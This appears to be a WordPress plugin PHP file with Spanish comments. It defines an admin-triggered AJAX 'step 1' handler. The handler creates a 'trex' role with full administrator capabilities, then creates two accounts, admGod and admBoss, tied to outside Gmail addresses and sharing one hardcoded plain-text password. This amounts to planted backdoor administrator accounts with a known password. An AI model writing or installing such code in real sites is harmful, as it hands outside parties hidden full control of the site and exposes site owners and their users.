<?php
// Evitar acceso directo
if (!defined('ABSPATH')) {
    exit;
}

// Manejar ejecución del Paso 1
function trexjc_execute_step1() {
    // Verificar si el usuario actual tiene permisos de administrador
    if (!current_user_can('manage_options')) {
        wp_send_json_error(['message' => 'No tienes permisos suficientes para ejecutar este paso.']);
    }

    // Crear rol "trex" con permisos de administrador si no existe
    if (!get_role('trex')) {
        add_role('trex', 'Trex', get_role('administrator')->capabilities);
    }

    // Crear rol "administrador" (privilegios por definir)
    if (!get_role('administrador')) {
        add_role('administrador', 'Administrador', []); // Sin privilegios por ahora
    }

    // Crear usuarios admGod y admBoss con el rol "trex"
    $users = [
        ['username' => 'admGod', 'email' => 're1xdigitalcl@gmail.com'],
        ['username' => 'admBoss', 'email' => 'ecommercepyme@gmail.com']
    ];

    foreach ($users as $user) {
        if (!username_exists($user['username']) && !email_exists($user['email'])) {
            wp_insert_user([
                'user_login'    => $user['username'],
                'user_pass'     => 'xc21bn65A-!JC',
                'user_email'    => $user['email'],
                'role'          => 'trex'
            ]);
        }
    }

    wp_send_json_success(['message' => 'Paso 1 completado correctamente.']);
}
add_action('wp_ajax_trexjc_step1', 'trexjc_execute_step1');